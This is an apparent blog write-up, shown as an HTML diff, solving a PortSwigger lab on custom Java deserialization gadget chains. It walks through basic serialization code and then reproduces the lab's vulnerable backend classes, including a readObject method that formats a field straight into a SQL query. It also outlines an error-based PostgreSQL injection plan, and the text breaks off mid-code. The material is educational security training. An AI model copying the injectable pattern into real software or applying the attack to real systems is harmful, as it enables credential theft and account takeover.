@@ -1,0 +1,801 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/portswigger-java-custom-gadget-chain/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization"/>
+<meta name="twitter:description" content="Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization."/>
+
+
+
+<meta property="og:title" content="Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization"/>
+<meta property="og:description" content="Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/portswigger-java-custom-gadget-chain/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-07-19T13:55:00+00:00"/>
+<meta property="article:modified_time" content="2020-07-19T13:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-07-19
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/oswe/">#OSWE</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/java/">#Java</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/deserialization/">#Deserialization</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/java-deserialization/">#Java Deserialization</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/sql-injection/">#SQL Injection</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/postgresql/">#PostgreSQL</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="disclaimer">DISCLAIMER</h1>
+<p>This post is <strong>beginner-oriented</strong> since I’m not as experienced in this field as I wished, but I want to share what I’ve learnt the past few days, so please keep in mind that <strong>errors can appear</strong> (and they will). Furthermore, if you see that there’s something wrong, <em>feel totally free to contact me via <a href="https://twitter.com/jorge_ctf" target="_blank">Twitter</a> or <a href="https://t.me/jorgectf" target="_blank">Telegram</a></em>.</p>
+<h1 id="spoilers-ahead">SPOILERS AHEAD</h1>
+<p>This lab is hosted at <a href="https://portswigger.net/" target="_blank">PortSwigger</a>. If you feel attracted by this kind of vulnerabilities and have some free time, I encourage you to go and give it a try! Sometimes we learn further by trying rather than by reading.</p>
+<h1 id="tldr">TL;DR</h1>
+<p>Following OSWE’s studying content, I came up with the feeling of learning deserialization attacks on different languages. PHP was the first to draw my attention, but it was kind of easier for me, since it appears in lots of CTFs. Then Java appeared, and here we are! almost half a week after I firstly discovered what Java packages were (lol).</p>
+<p>In this post, we’ll be soving “<strong>Developing a custom gadget chain for Java deserialization</strong>” from <a href="https://portswigger.net/" target="_blank">PortSwigger</a>. In a nutshell, we’ll be creating a custom Java object (following the <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization" target="_blank">challenge</a>’s backend) to exploit a simple Error-Based PostgreSQL Injection by casting the administrator’s password to an integer.</p>
+<h1 id="basic-java-serializationdeserialization">Basic Java Serialization/Deserialization</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.io.FileInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.FileOutputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectOutputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">POC</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+	<span style="color:#66d9ef">private</span> String data<span style="color:#f92672">;</span>
+	
+	<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">POC</span><span style="color:#f92672">(</span>String testData<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> testData<span style="color:#f92672">;</span>
+	<span style="color:#f92672">}</span>
+	
+	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getData</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+		<span style="color:#66d9ef">return</span> data<span style="color:#f92672">;</span>
+	<span style="color:#f92672">}</span>
+
+
+  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Serialize</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+        <span style="color:#75715e">// Object Creation
+</span><span style="color:#75715e"></span>        POC poctest <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POC<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;This is a POC!&#34;</span><span style="color:#f92672">);</span>
+        <span style="color:#75715e">// Creating output stream and writing the serialized object
+</span><span style="color:#75715e"></span>        FileOutputStream outfile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;serialized.object&#34;</span><span style="color:#f92672">);</span>
+        ObjectOutputStream outstream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>outfile<span style="color:#f92672">);</span>
+        outstream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>poctest<span style="color:#f92672">);</span>
+        <span style="color:#75715e">// Closing the stream
+</span><span style="color:#75715e"></span>        outstream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Serialized object saved to serialized.object&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}}</span>
+    
+  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Deserialize</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span>
+        ObjectInputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;serialized.object&#34;</span><span style="color:#f92672">));</span>
+        POC poctest <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>POC<span style="color:#f92672">)</span>in<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+        <span style="color:#75715e">// Printing the data of the serialized object
+</span><span style="color:#75715e"></span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Object&#39;s data: &#34;</span> <span style="color:#f92672">+</span> poctest<span style="color:#f92672">.</span><span style="color:#a6e22e">data</span><span style="color:#f92672">);</span>
+        <span style="color:#75715e">// Closing the stream
+</span><span style="color:#75715e"></span>        in<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span><span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
+            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+            <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+
+  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String args<span style="color:#f92672">[])</span> <span style="color:#f92672">{</span>
+        POC<span style="color:#f92672">.</span><span style="color:#a6e22e">Serialize</span><span style="color:#f92672">();</span>
+        POC<span style="color:#f92672">.</span><span style="color:#a6e22e">Deserialize</span><span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span>
+
+<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="used-libraries">Used Libraries</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// Playing with File Input/Output bytes.
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> java.io.FileInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.FileOutputStream<span style="color:#f92672">;</span>
+
+<span style="color:#75715e">// Playing with Serialization/Deserialization of Input&#39;s Object.
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> java.io.ObjectInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectOutputStream<span style="color:#f92672">;</span>
+
+<span style="color:#75715e">// Setting the ability to be deserialized.
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+</code></pre></div><h3 id="main-class-structure">Main class structure</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">POC</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+	<span style="color:#66d9ef">private</span> String data<span style="color:#f92672">;</span>
+	
+	<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">POC</span><span style="color:#f92672">(</span>String testData<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> testData<span style="color:#f92672">;</span>
+	<span style="color:#f92672">}</span>
+	
+	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getData</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+		<span style="color:#66d9ef">return</span> data<span style="color:#f92672">;</span>
+	<span style="color:#f92672">}</span>
+</code></pre></div><p>This <code>POC</code> class contains a <code>POC()</code> function that sets its data variable to the value provided, and another <code>getData()</code> that will be returning data variable’s value. The last appears because this is a demostration, otherwise it wouldn’t be needed since we just want to edit the variable.</p>
+<h2 id="serializingdeserializing">Serializing/Deserializing</h2>
+<p>This serializing function can belong to the class <em>to-be-deserialized</em> or to the <em>main</em> class. In this POC, as the POC class doesn’t imply any kind of structure, the serializing/deserializing function can be declared inside <strong>itself</strong>.</p>
+<ul>
+<li>Serializing</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Serialize</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+        POC poctest <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POC<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;This is a POC!&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">//Instantiation of a new POC-type Object following POC() function
+</span><span style="color:#75715e"></span>        
+        FileOutputStream outfile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;serialized.object&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">//Creation of the output stream to a file
+</span><span style="color:#75715e"></span>
+        ObjectOutputStream outstream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>outfile<span style="color:#f92672">);</span> <span style="color:#75715e">//Creation of the Object output stream through the previous output stream.
+</span><span style="color:#75715e"></span>
+        outstream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>poctest<span style="color:#f92672">);</span> <span style="color:#75715e">//Writting the Object to the file&#39;s output stream. 
+</span><span style="color:#75715e"></span>        
+        outstream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span> <span style="color:#75715e">//Closing the output stream.
+</span><span style="color:#75715e"></span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Serialized object saved to serialized.object&#34;</span><span style="color:#f92672">);</span>
+
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e">//Catch and print any error/exception.
+</span><span style="color:#75715e"></span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}}</span>
+</code></pre></div><ul>
+<li>Deserializing</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Deserialize</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+        FileInputStream infile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;serialized.object&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">//Creation of the input stream from a file.
+</span><span style="color:#75715e"></span>
+        ObjectInputStream instream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>infile<span style="color:#f92672">);</span> <span style="color:#75715e">//Deserializing the input stream&#39;s object passed.
+</span><span style="color:#75715e"></span>
+        POC poctest <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>POC<span style="color:#f92672">)</span>instream<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span> <span style="color:#75715e">//Instantiation of previous read object.
+</span><span style="color:#75715e"></span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Object&#39;s data: &#34;</span> <span style="color:#f92672">+</span> poctest<span style="color:#f92672">.</span><span style="color:#a6e22e">data</span><span style="color:#f92672">);</span>
+        
+        instream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span> <span style="color:#75715e">//Closing the input stream.
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}}</span>
+</code></pre></div><h2 id="testing">Testing</h2>
+<pre tabindex="0"><code>$ javac POC.java &amp;&amp; java POC
+
+Serialized object saved to serialized.object
+Object&#39;s data: This is a POC!
+</code></pre><pre tabindex="0"><code>hexdump -C serialized.object
+
+00000000  ac ed 00 05 73 72 00 03  50 4f 43 b0 1e cd 0f fa  |....sr..POC.....|
+00000010  62 1f 9f 02 00 01 4c 00  04 64 61 74 61 74 00 12  |b.....L..datat..|
+00000020  4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e  |Ljava/lang/Strin|
+00000030  67 3b 78 70 74 00 0e 54  68 69 73 20 69 73 20 61  |g;xpt..This is a|
+00000040  20 50 4f 43 21                                    | POC!|
+00000045
+</code></pre><p>If we wanted to inject other data, we would just have to rewrite the object with the desired data and read it through the <code>Deserialize()</code> function.</p>
+<h1 id="the-challenge">The challenge</h1>
+<pre tabindex="0"><code>This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab&#39;s insecure deserialization to obtain the administrator&#39;s password.
+
+To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator&#39;s password. Then, log in as the administrator and delete Carlos&#39;s account.
+
+You can access your own account using the following credentials: wiener:peter 
+</code></pre><p>We are facing a shop with some products and a login functionality. Using the credentials provided in the description, a <strong>new session cookie</strong> is generated. This cookie contains a <strong>Java Base64-Encoded Object</strong> from <code>data.session.token.AccessTokenUsers</code>.</p>
+<pre tabindex="0"><code>session=rO0...
+�sr&#34;data.session.token.AccessTokenUsers
+</code></pre><ul>
+<li>¡! Notice the structure (package data.session.token) - AccessTokenUsers class.</li>
+</ul>
+<p>By sending <code>cookie(&#34;session=a&#34;)</code> we can see the backend doing something with our session cookie’s value.</p>
+<h2 id="discovering-the-backend">Discovering the backend</h2>
+<p>Reading the <em>source code</em>, a <strong>strange comment</strong> can be spotted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--/backup/AccessTokenUser.java&gt;Example user--&gt;</span>
+</code></pre></div><h3 id="accesstokenuserjava">AccessTokenUser.java</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> data.session.token<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AccessTokenUser</span> <span style="color:#66d9ef">implements</span> Serializable
+<span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> String username<span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> String accessToken<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AccessTokenUser</span><span style="color:#f92672">(</span>String username<span style="color:#f92672">,</span> String accessToken<span style="color:#f92672">)</span>
+    <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> username<span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">accessToken</span> <span style="color:#f92672">=</span> accessToken<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUsername</span><span style="color:#f92672">()</span>
+    <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> username<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getAccessToken</span><span style="color:#f92672">()</span>
+    <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> accessToken<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>There we have the class that our cookie object was serialized from. The backend was probably serializing this object with our credentials and then deserializing it in each request. But this has no impact. We could probably impersonate any user, but there’s some type of authentication check, as we don’t know the accessToken the administrator must have.</p>
+<p>Later on, I came up with the idea of requesting just <code>/backup/</code>, and another file appeared.</p>
+<h3 id="producttemplatejava">ProductTemplate.java</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> data.productcatalog<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> common.db.ConnectionBuilder<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.sql.Connection<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.sql.ResultSet<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.sql.SQLException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.sql.Statement<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ProductTemplate</span> <span style="color:#66d9ef">implements</span> Serializable
+<span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> String id<span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">transient</span> Product product<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ProductTemplate</span><span style="color:#f92672">(</span>String id<span style="color:#f92672">)</span>
+    <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> id<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>ObjectInputStream inputStream<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException
+    <span style="color:#f92672">{</span>
+        inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">defaultReadObject</span><span style="color:#f92672">();</span>
+
+        ConnectionBuilder connectionBuilder <span style="color:#f92672">=</span> ConnectionBuilder<span style="color:#f92672">.</span><span style="color:#a6e22e">from</span><span style="color:#f92672">(</span>
+                <span style="color:#e6db74">&#34;org.postgresql.Driver&#34;</span><span style="color:#f92672">,</span>
+                <span style="color:#e6db74">&#34;postgresql&#34;</span><span style="color:#f92672">,</span>
+                <span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">,</span>
+                5432<span style="color:#f92672">,</span>
+                <span style="color:#e6db74">&#34;postgres&#34;</span><span style="color:#f92672">,</span>
+                <span style="color:#e6db74">&#34;postgres&#34;</span><span style="color:#f92672">,</span>
+                <span style="color:#e6db74">&#34;password&#34;</span>
+        <span style="color:#f92672">).</span><span style="color:#a6e22e">withAutoCommit</span><span style="color:#f92672">();</span>
+        <span style="color:#66d9ef">try</span>
+        <span style="color:#f92672">{</span>
+            Connection connect <span style="color:#f92672">=</span> connectionBuilder<span style="color:#f92672">.</span><span style="color:#a6e22e">connect</span><span style="color:#f92672">(</span>30<span style="color:#f92672">);</span>
+            String sql <span style="color:#f92672">=</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SELECT * FROM products WHERE id = &#39;%s&#39; LIMIT 1&#34;</span><span style="color:#f92672">,</span> id<span style="color:#f92672">);</span>
+            Statement statement <span style="color:#f92672">=</span> connect<span style="color:#f92672">.</span><span style="color:#a6e22e">createStatement</span><span style="color:#f92672">();</span>
+            ResultSet resultSet <span style="color:#f92672">=</span> statement<span style="color:#f92672">.</span><span style="color:#a6e22e">executeQuery</span><span style="color:#f92672">(</span>sql<span style="color:#f92672">);</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>resultSet<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">())</span>
+            <span style="color:#f92672">{</span>
+                <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+            <span style="color:#f92672">}</span>
+            product <span style="color:#f92672">=</span> Product<span style="color:#f92672">.</span><span style="color:#a6e22e">from</span><span style="color:#f92672">(</span>resultSet<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>SQLException e<span style="color:#f92672">)</span>
+        <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IOException<span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getId</span><span style="color:#f92672">()</span>
+    <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> id<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> Product <span style="color:#a6e22e">getProduct</span><span style="color:#f92672">()</span>
+    <span style="color:#f92672">{</span>
